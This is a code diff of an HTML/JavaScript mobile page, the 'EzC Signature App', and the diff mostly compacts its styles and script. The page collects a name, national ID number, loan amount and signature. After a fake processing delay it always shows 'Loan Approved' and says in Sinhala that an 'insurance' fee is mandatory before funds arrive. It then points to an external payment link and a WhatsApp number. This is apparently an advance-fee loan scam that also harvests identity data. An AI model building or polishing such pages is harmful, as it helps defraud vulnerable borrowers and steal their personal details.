@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 
-<!-- Mobile safe viewport -->
 <meta name="viewport"
  content="width=device-width,
  initial-scale=1,
@@ -15,23 +14,17 @@
 <title>EzC Signature App</title>
 
 <style>
-*{box-sizing:border-box; -webkit-tap-highlight-color:transparent;}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
 html,body{
- margin:0;
- padding:0;
- width:100%;
- height:100%;
- overflow:hidden;
- font-family:system-ui;
+ margin:0;padding:0;width:100%;height:100%;
+ overflow:hidden;font-family:system-ui;
  background:#eaeef3;
  touch-action:manipulation;
  overscroll-behavior:none;
 }
 .app{
- max-width:420px;
- height:100%;
- margin:auto;
- background:#fff;
+ max-width:420px;height:100%;
+ margin:auto;background:#fff;
  overflow-y:auto;
  -webkit-overflow-scrolling:touch;
 }
@@ -39,64 +32,49 @@ html,body{
 h3{text-align:center;}
 label{display:block;margin-top:14px;font-weight:600;}
 input,select{
- width:100%;
- padding:14px;
- margin-top:6px;
- border-radius:12px;
- border:1px solid #ccc;
- font-size:16px;
- -webkit-text-size-adjust:100%;
- line-height:1.4;
+ width:100%;padding:14px;margin-top:6px;
+ border-radius:12px;border:1px solid #ccc;
+ font-size:16px;line-height:1.4;
 }
 button{
- width:100%;
- padding:14px;
- margin-top:14px;
- border:none;
- border-radius:14px;
- font-size:16px;
- color:#fff;
- cursor:pointer;
+ width:100%;padding:14px;margin-top:14px;
+ border:none;border-radius:14px;
+ font-size:16px;color:#fff;cursor:pointer;
 }
 .next-btn{background:#27ae60;}
 .clear-btn{background:#e74c3c;}
 .pay-btn{background:#2980b9;}
 .whatsapp-btn{background:#25D366;}
 .info-btn{background:#8e44ad;}
+
 .statement{
- margin-top:12px;
- padding:12px;
- background:#f4f6f8;
- border-radius:12px;
+ margin-top:12px;padding:12px;
+ background:#f4f6f8;border-radius:12px;
  font-size:14px;
 }
+
 canvas{
- width:100%;
- height:160px;
+ width:100%;height:160px;
  border:2px dashed #aaa;
- border-radius:12px;
- margin-top:8px;
+ border-radius:12px;margin-top:8px;
  background:#fff;
  touch-action:none;
- user-select:none;
- -webkit-user-select:none;
- -webkit-touch-callout:none;
 }
+
 #page2{display:none;}
+
 #loading{
- position:fixed;
- inset:0;
+ position:fixed;inset:0;
  background:rgba(255,255,255,.96);
  display:none;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  z-index:999;
- text-align:center;
 }
+
 .spinner{
- width:48px;
- height:48px;
+ width:48px;height:48px;
  border:5px solid #ddd;
  border-top:5px solid #27ae60;
  border-radius:50%;
@@ -104,28 +82,22 @@ canvas{
  margin-bottom:16px;
 }
 @keyframes spin{100%{transform:rotate(360deg);}}
+
 .progress-container{
- width:100%;
- height:18px;
- background:#eee;
- border-radius:9px;
- margin-top:20px;
- overflow:hidden;
+ width:100%;height:18px;
+ background:#eee;border-radius:9px;
+ margin-top:20px;overflow:hidden;
  position:relative;
 }
 .progress-bar{
- width:0%;
- height:100%;
+ width:0%;height:100%;
  background:#27ae60;
  transition:width .3s;
 }
 .progress-num{
- position:absolute;
- top:0;
- left:50%;
+ position:absolute;left:50%;
  transform:translateX(-50%);
- font-size:12px;
- font-weight:600;
+ font-size:12px;font-weight:600;
 }
 </style>
 </head>
@@ -134,7 +106,6 @@ canvas{
 
 <div class="app">
 
-<!-- PAGE 1 -->
 <div class="page" id="page1">
 <h3>Customer Details</h3>
 
@@ -164,7 +135,6 @@ canvas{
 </div>
 </div>
 
-<!-- PAGE 2 -->
 <div class="page" id="page2">
 <h3>Loan Approved</h3>
 
@@ -174,8 +144,7 @@ canvas{
 
 <div class="statement">
 මෙම රක්ෂණ මුදල ගෙවීම් කිරීම අනිවාර්යයි<br><br>
-රක්ෂණ මුදල ගෙවූ පසු ඔබගෙ ණය මුදල පැයක් වැනි කාලයක් ඇතුළත ඔබගෙ ගිණුමට ස්වයංක්‍රියව ලැබෙනු ඇත<br><br>
-රක්ෂණ මුදල ගෙවූ රිසිට් පත upload කරන්න
+රක්ෂණ මුදල ගෙවූ පසු පැයක් ඇතුළත ඔබගෙ ගිණුමට මුදල ලැබේ
 </div>
 
 <label>Upload Receipt</label>
@@ -191,9 +160,9 @@ canvas{
  <div class="progress-num" id="progressNum2">0%</div>
 </div>
 </div>
+
 </div>
 
-<!-- LOADING -->
 <div id="loading">
  <div class="spinner"></div>
  <div id="loadingText">Loading...</div>
@@ -204,14 +173,20 @@ const PAY_LINK="https://ezcservice.github.io/ezcservice-i/";
 const INSURANCE_INFO_LINK="https://example.com/insurance-info";
 const WHATSAPP_NO="94742089009";
 
-let EZ_ID="";
-let hasSignature=false;
-
 /* DOM */
+const page1=document.getElementById("page1");
+const page2=document.getElementById("page2");
+const loading=document.getElementById("loading");
+const loadingText=document.getElementById("loadingText");
+
 const nameEl=document.getElementById("name");
 const nicEl=document.getElementById("nic");
 const amountEl=document.getElementById("amount");
 const receiptEl=document.getElementById("receiptUpload");
+
+const customerId=document.getElementById("customerId");
+const showAmount=document.getElementById("showAmount");
+const insurance=document.getElementById("insurance");
 
 /* INSURANCE */
 function calculateInsurance(a){
@@ -228,7 +203,7 @@ function calculateInsurance(a){
 /* SIGNATURE */
 const c=document.getElementById("sign");
 const ctx=c.getContext("2d");
-let draw=false;
+let draw=false, hasSignature=false;
 
 function resizeCanvas(){
  const r=c.getBoundingClientRect();
@@ -238,25 +213,19 @@ function resizeCanvas(){
  ctx.lineCap="round";
 }
 resizeCanvas();
+window.addEventListener("resize",resizeCanvas);
 
 c.addEventListener("pointerdown",e=>{
- e.preventDefault();
- draw=true; hasSignature=true;
+ draw=true;hasSignature=true;
  ctx.beginPath();
  ctx.moveTo(e.offsetX,e.offsetY);
 });
-
 c.addEventListener("pointermove",e=>{
  if(!draw) return;
- e.preventDefault();
  ctx.lineTo(e.offsetX,e.offsetY);
  ctx.stroke();
 });
-
-c.addEventListener("pointerup",e=>{
- e.preventDefault();
- draw=false;
-});
+c.addEventListener("pointerup",()=>draw=false);
 c.addEventListener("pointerleave",()=>draw=false);
 
 function clearSign(){
@@ -265,16 +234,16 @@ function clearSign(){
 }
 
 /* PROGRESS */
-function animateProgressBar(barId,numId,start,end,dur){
+function animateProgress(barId,numId,to,dur){
  const bar=document.getElementById(barId);
  const num=document.getElementById(numId);
- let t=null;
- function step(ts){
-  if(!t) t=ts;
-  let p=Math.min((ts-t)/dur,1);
-  let v=start+(end-start)*p;
+ let start=0,startTime=null;
+ function step(t){
+  if(!startTime) startTime=t;
+  let p=Math.min((t-startTime)/dur,1);
+  let v=Math.floor(p*to);
   bar.style.width=v+"%";
-  num.innerText=Math.floor(v)+"%";
+  num.innerText=v+"%";
   if(p<1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
@@ -283,15 +252,11 @@ function animateProgressBar(barId,numId,start,end,dur){
 /* NEXT */
 function goNext(){
  if(!nameEl.value||!nicEl.value||!amountEl.value){
-  alert("කරුණාකර සියලු fields පුරවන්න");
-  return;
+  alert("සියලු fields පුරවන්න");return;
  }
- if(!hasSignature){
-  alert("Signature එක දාන්න");
-  return;
- }
+ if(!hasSignature){alert("Signature එක දාන්න");return;}
 
- animateProgressBar("progress1","progressNum1",60,100,3000);
+ animateProgress("progress1","progressNum1",100,2000);
 
  loading.style.display="flex";
  loadingText.innerText="Processing...";
@@ -301,48 +266,34 @@ function goNext(){
   page1.style.display="none";
   page2.style.display="block";
 
-  EZ_ID="EZ-"+Date.now();
+  const EZ_ID="EZ-"+Date.now();
   customerId.innerText=EZ_ID;
   showAmount.innerText=amountEl.value;
   insurance.innerText=calculateInsurance(amountEl.value);
 
-  animateProgressBar("progress2","progressNum2",60,90,2000);
- },8000);
+  animateProgress("progress2","progressNum2",90,2000);
+ },5000);
 }
 
-/* SUBMIT */
+/* ACTIONS */
 function submitDetails(){
- if(!receiptEl.files||receiptEl.files.length===0){
-  alert("කරුණාකර රිසිට් පත upload කරන්න");
-  return;
+ if(!receiptEl.files.length){
+  alert("Receipt upload කරන්න");return;
  }
  alert("Submission සාර්ථකයි ✔️");
 }
-
-/* PAY – MOBILE SAFE POPUP */
 function payNow(){
- // 1️⃣ Open payment immediately (mobile safe)
- const payWindow = window.open(PAY_LINK,"_blank");
-
- // 2️⃣ Show loading UI inside app
+ window.open(PAY_LINK,"_blank");
  loading.style.display="flex";
  loadingText.innerText="Payment gateway load වෙමින් පවතී...";
-
- setTimeout(()=>{
-  loading.style.display="none";
- },2000);
+ setTimeout(()=>loading.style.display="none",2000);
 }
-
-/* WHATSAPP */
 function sendWhatsApp(){
  const msg=`Loan Details
-Customer ID: ${EZ_ID}
 Amount: Rs.${showAmount.innerText}
 Insurance: Rs.${insurance.innerText}`;
  window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
 }
-
-/* INFO */
 function openInsuranceInfo(){
  window.open(INSURANCE_INFO_LINK,"_blank");
 }
